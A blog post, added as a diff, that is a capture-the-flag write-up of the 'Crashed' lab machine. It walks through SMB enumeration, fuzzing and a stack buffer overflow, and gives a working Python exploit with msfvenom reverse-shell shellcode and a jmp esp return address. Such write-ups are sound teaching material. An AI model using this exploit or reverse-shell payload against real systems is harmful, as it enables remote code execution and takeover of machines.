@@ -1,0 +1,178 @@
+---
+layout: single
+title:  "CyberTalents: Crashed"
+classes: wide
+excerpt: "Crashed is rated as a Hard machine that starts by anonymous SMB share folder that contained an executable and a DLL, Upon fuzzing the executable I find..."
+categories: CyberTalents
+toc: true
+---
+
+## Introduction
+Crashed is rated as a Hard machine that starts by anonymous SMB share folder that contained an executable and a DLL, Upon fuzzing the executable I find that it is vulnerable to a buffer overflow attack, abusing this issue I can get the box to send me a reverse shell as Admin
+
+## Recon
+nmap revealed a bunch of ports, including many typical of a Windows machine
+```bash
+nmap -p- --min-rate 10000 172.24.226.182
+```    
+
+![1](/assets/images/Crashed/1.jpeg){: width="500px" }
+
+## SMB – TCP 445
+
+Trying anonymous login on port 445 was a success and it showed 3 interesting shares
+```bash
+  smbmap -u "anonymous" -H 172.24.226.182
+```               
+
+![2](/assets/images/Crashed/2.png){: width="800px" }
+
+
+While enumerating the shares I found an executable and a dll located in vulnserver-master folder so, I downloaded a copy from the files to my machine for further analysis
+
+![3](/assets/images/Crashed/3.png){: width="800px" }
+
+## Server Analysis
+I opened up the files in IDA to see if something interesting can be found there and the DLL had no interesting functions to dig deeper into so, I turn my attention to the and I learn that the server runs by default on port 13337 unless it is told to run on different specific port. Going back to the nmap scan I try to netcat to some of the open ports and I see that the server runs on port 1887.
+
+![4](/assets/images/Crashed/4.png){: width="700px" }
+
+
+Now that I know that the server is accessible from my machine, I dig deeper into the code that handles the data sent to the server and at first glance the server seems to be using secure functions (strncpy) in copying data and stuff but, luckily there is a small problem with these functions that can still cause problems. Upon reaching the buffer limit, if a terminating character is not placed in the last byte of the buffer it can cause problems when the program tries to read from the buffer. So, to test this theory I start the server on my Windows VM and attach it to ImmunityDebugger (File -> Attach). 
+
+![5](/assets/images/Crashed/5.png)
+
+ Next, I wrote a simple Python script to fuzz the server and see If I can trigger a buffer overflow on the server
+```py
+import sys,socket
+from time import sleep
+
+buffer = "A"*100
+while True:
+        try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect(('192.168.1.68', 13337))
+                s.send(("SECRET" + buffer))
+                s.close()
+                sleep(1)
+                buffer += "A"*100
+        except:
+                print("Fuzzing crashed at " + str(len(buffer)) + " Bytes!")
+                sys.exit()
+```         
+
+The script is programmed to connect to my Windows VM on port 13337 and start sending the command `SECRET`{:style="color:orange"} (I knew about the `SECRET`{:style="color:orange"} command from disassembling the server in IDA) Along side some dummy data and see if I can crash the server at some point... I run the script and wait for something to happen in ImmunityDebugger and after a few seconds I find the following.
+
+![6](/assets/images/Crashed/6.png){: width="800px" }
+
+After seeing the I overwrote the EIP with 41’s which is the ASCII representation of "A" I quickly press `CTRL+C` to stop my script and find out approximately how many bytes caused the crash
+
+![7](/assets/images/Crashed/7.png){: width="500px" }
+
+## Building an Exploit
+
+Knowing that the server is vulnerable to buffer overflow attack the first thing I need to do is figure out exactly how many bytes will cause the crash so, I use `mona.py` to generate a pattern which I can send to the server and figure out the exact amount of characters needed to overwrite the EIP. To do so I type the following in the debugger console `!mona pattern_create 1100`{:style="color:orange"}. This by default generates a pattern located in `C:\Program Files\Immunity Inc\Immunity Debugger\pattern.txt`{:style="color:orange"}.
+
+Next, I'll restart the server (Hit `CTRL+F2` in Immunity), connect to it and send the pattern along with `SECRET`{:style="color:orange"} So, the payload is something like -> `SERCER[Pattern] `{:style="color:orange"}
+
+![8](/assets/images/Crashed/8.png){: width="500px" }
+
+Upon sending the payload I see that `EIP` is overwritten with `33684232`{:style="color:orange"} so I give that value to mona to figure out the offset and we get that EIP is overwritten after sending `998` characters
+
+`!mona pattern_offset 33684232`{:style="color:orange"}
+
+![9](/assets/images/Crashed/9.png){: width="700px" }
+
+Note: the 998 characters are the characters sent after the SECRET command Now, to test my findings I use
+```bash
+Python -c "print('SECRET' + 'A'*998 + 'BBBB' + 'C'*200)
+```                
+to generate some dummy data for testing, and after restarting the server and sending the data I see the following:
+
+![10](/assets/images/Crashed/10.png){: width="500px" }
+
+I see that EIP was overwritten with 42’s which is the equivalent of `B`{:style="color:orange"} and then the stack contains some `C`{:style="color:orange"}’s. We notice that the C’s begin at address `0x12BF728` which is the same address that ESP points to So, if we can get EIP to point that address and place our shellcode there we can get code execution but since the address starts with a Null-Byte which is treated as a string-terminator the application will most likely stop copying anything that follows the null byte.
+
+But what if we can set EIP to point to a location which has an instruction that can force EIP to point to ESP, and of course that instruction’s address can not start with a null byte... To find such instruction I use mona again to find candidates
+`!mona jmp -r ESP`{:style="color:orange"}
+
+![11](/assets/images/Crashed/11.png){: width="800px" }
+
+I get many addresses that contains the instruction I desire and none of them starts with a Null byte So, I’ll pick the highlighted one to use for my exploit We can now control EIP and can make it point to the top of the top of the stack (ESP) so the only thing that is missing is to put a shellcode that’ll get executed and connect back to us. For this simple example I use msfvenome to generate the shellcode
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.65 LPORT=1234 --platform windows -a x86 -b '\x00\x0a' -f c
+```
+
+Now that shellcode will force the server to connect back to my parrot machine on port 1234
+
+## The Final Exploit
+
+```py
+import socket, sys
+from time import sleep
+
+shellcode =("\xdb\xc8\xbd\xb5\xd8\xa7\xd2\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+"\x52\x31\x6a\x17\x83\xc2\x04\x03\xdf\xcb\x45\x27\xe3\x04\x0b"
+"\xc8\x1b\xd5\x6c\x40\xfe\xe4\xac\x36\x8b\x57\x1d\x3c\xd9\x5b"
+"\xd6\x10\xc9\xe8\x9a\xbc\xfe\x59\x10\x9b\x31\x59\x09\xdf\x50"
+"\xd9\x50\x0c\xb2\xe0\x9a\x41\xb3\x25\xc6\xa8\xe1\xfe\x8c\x1f"
+"\x15\x8a\xd9\xa3\x9e\xc0\xcc\xa3\x43\x90\xef\x82\xd2\xaa\xa9"
+"\x04\xd5\x7f\xc2\x0c\xcd\x9c\xef\xc7\x66\x56\x9b\xd9\xae\xa6"
+"\x64\x75\x8f\x06\x97\x87\xc8\xa1\x48\xf2\x20\xd2\xf5\x05\xf7"
+"\xa8\x21\x83\xe3\x0b\xa1\x33\xcf\xaa\x66\xa5\x84\xa1\xc3\xa1"
+"\xc2\xa5\xd2\x66\x79\xd1\x5f\x89\xad\x53\x1b\xae\x69\x3f\xff"
+"\xcf\x28\xe5\xae\xf0\x2a\x46\x0e\x55\x21\x6b\x5b\xe4\x68\xe4"
+"\xa8\xc5\x92\xf4\xa6\x5e\xe1\xc6\x69\xf5\x6d\x6b\xe1\xd3\x6a"
+"\x8c\xd8\xa4\xe4\x73\xe3\xd4\x2d\xb0\xb7\x84\x45\x11\xb8\x4e"
+"\x95\x9e\x6d\xc0\xc5\x30\xde\xa1\xb5\xf0\x8e\x49\xdf\xfe\xf1"
+"\x6a\xe0\xd4\x99\x01\x1b\xbf\x09\xcd\x81\xc3\x3a\xec\xc5\x3f"
+"\x69\x79\x23\x55\x9d\x2c\xfc\xc2\x04\x75\x76\x72\xc8\xa3\xf3"
+"\xb4\x42\x40\x04\x7a\xa3\x2d\x16\xeb\x43\x78\x44\xba\x5c\x56"
+"\xe0\x20\xce\x3d\xf0\x2f\xf3\xe9\xa7\x78\xc5\xe3\x2d\x95\x7c"
+"\x5a\x53\x64\x18\xa5\xd7\xb3\xd9\x28\xd6\x36\x65\x0f\xc8\x8e"
+"\x66\x0b\xbc\x5e\x31\xc5\x6a\x19\xeb\xa7\xc4\xf3\x40\x6e\x80"
+"\x82\xaa\xb1\xd6\x8a\xe6\x47\x36\x3a\x5f\x1e\x49\xf3\x37\x96"
+"\x32\xe9\xa7\x59\xe9\xa9\xd8\x13\xb3\x98\x70\xfa\x26\x99\x1c"
+"\xfd\x9d\xde\x18\x7e\x17\x9f\xde\x9e\x52\x9a\x9b\x18\x8f\xd6"
+"\xb4\xcc\xaf\x45\xb4\xc4")
+
+buf = "A"*998
+buf += "\xba\x12\x50\x62" # 0x625012ba <-- jmp esp
+buf += "\x90"*48 # added a NOP slide of possible stack misalignment
+buf += shellcode
+buf += "C"*(600-len(shellcode))
+try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("192.168.1.68", 13337))
+        s.send(("SECRET"+buf))
+        sleep(1)
+        s.close()
+        print("[+] Success!")
+except:
+        print("Failed")
+        sys.exit()
+```               
+
+
+The Exploit simply sends the `SECRET` command followed by 992 A’s then it writes the address of `jmp esp` to EIP then I added a punch of NOP assembly instructions just in case of any `stack-misalignment`, I send my shell code that EIP will point to and execute. Finally, I connect to my Windows VM and send the payload and look at my netcat listener on my Parrot VM and I get a shell.
+
+![12](/assets/images/Crashed/12.png){: width="800px" }
+
+Now that we have a working shell, I generate a new shellcode with the IP of the remote machine and replace the old shellcode with the new one and I get a shell on the box. The first thing I do is run `whoami` and see that I’m Admin on the box, so I navigate to desktop and get the flag.
+
+![13](/assets/images/Crashed/13.png){: width="800px" }
+
+
+## Beyond Admin
+
+Now after getting the highest privilege on the machine I was curious how would someone after me can get into the machine given that I just caused a buffer overflow on the server and It has crashed so, I launched my exploit once again to find out that I can still get a shell so I run it quickly again and see that I can’t even connect to port 1887 but after a minute the port is up and functional again.
+
+The first thing that came to my mind is that there is a scheduled job on the machine that is responsible for restarting the server every now and then. To verify my assumption, I used `SCHTASKS` and saw an interesting scheduled task called loop
+
+![14](/assets/images/Crashed/14.png){: width="800px" }
+
+So, to get more info about it I type `SCHTASKS /query /v /tn loop`{:style="color:orange"} to see the following
+
+![15](/assets/images/Crashed/15.png){: width="800px" }
+
+this is the task that is responsible for restarting the `secure_server` application every 1 minute and that is how you can get a shell on the machine without the need to restart the entire machine after each crash
